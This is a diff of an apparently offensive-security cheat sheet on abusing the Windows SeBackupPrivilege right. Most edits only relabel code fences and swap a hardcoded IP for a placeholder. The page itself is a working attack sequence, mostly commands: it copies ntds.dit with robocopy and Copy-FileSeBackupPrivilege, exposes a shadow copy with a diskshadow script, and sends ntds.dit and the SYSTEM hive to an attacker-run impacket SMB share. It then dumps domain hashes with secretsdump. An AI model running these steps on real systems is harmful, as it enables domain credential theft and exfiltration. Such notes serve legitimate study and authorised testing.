@@ -4,12 +4,11 @@ date: 2024-7-18
 tags: ["SeBackupPrivilege", "SeRestorePrivilege", "privesc", "Windows", "Backup Operators", "diskshadow", "secretsdump"]
 ---
 
----
 ### Abuse #1: Robocopy
 
 <div>
 
-```powershell
+```console
 # For example
 robocopy /b <TARGET_DIR_PATH> C:\Windows\Tasks <TARGET_FILE>
 ```
@@ -24,19 +23,19 @@ robocopy /b <TARGET_DIR_PATH> C:\Windows\Tasks <TARGET_FILE>
 
 <div>
 
-```powershell
+```console
 import-module .\SeBackupPrivilegeCmdLets.dll
 ```
 
-```powershell
+```console
 import-module .\SeBackupPrivilegeUtils.dll
 ```
 
-```powershell
+```console
 Copy-FileSeBackupPrivilege <TARGET_FILE_PATH> C:\ProgramData\<TARGET_FILE>
 ```
 
-```powershell
+```console
 # For example
 Copy-FileSeBackupPrivilege C:\Windows\ntds\ntds.dit C:\ProgramData\ntds.dit
 ```
@@ -57,7 +56,7 @@ Copy-FileSeBackupPrivilege C:\Windows\ntds\ntds.dit C:\ProgramData\ntds.dit
 
 <div>
 
-```bash
+```console
 set context persistent nowriters
 set metadata C:\ProgramData\test.cab
 set verbose on
@@ -72,7 +71,7 @@ expose %test% x:
 
 <div>
 
-```bash
+```console
 # Convert to dos format
 unix2dos vss.dsh
 ```
@@ -83,7 +82,7 @@ unix2dos vss.dsh
 
 <div>
 
-```powershell
+```console
 # Upload and run
 diskshadow /s C:\ProgramData\vss.dsh
 ```
@@ -94,7 +93,7 @@ diskshadow /s C:\ProgramData\vss.dsh
 
 <div>
 
-```bash
+```console
 impacket-smbserver share . -smb2support
 ```
 
@@ -104,16 +103,16 @@ impacket-smbserver share . -smb2support
 
 <div>
 
-```bash
-net use \\10.10.14.10\share
+```console
+net use \\<LOCAL_IP>\share
 ```
 
-```bash
-Copy-FileSeBackupPrivilege x:\Windows\ntds\ntds.dit \\10.10.14.10\share\ntds.dit
+```console
+Copy-FileSeBackupPrivilege x:\Windows\ntds\ntds.dit \\<LOCAL_IP>\share\ntds.dit
 ```
 
-```bash
-reg.exe save hklm\system \\10.10.14.10\share\system
+```console
+reg.exe save hklm\system \\<LOCAL_IP>\share\system
 ```
 
 </div>
@@ -122,7 +121,7 @@ reg.exe save hklm\system \\10.10.14.10\share\system
 
 <div>
 
-```bash
+```console
 impacket-secretsdump -ntds ntds.dit -system system LOCAL
 ```
 
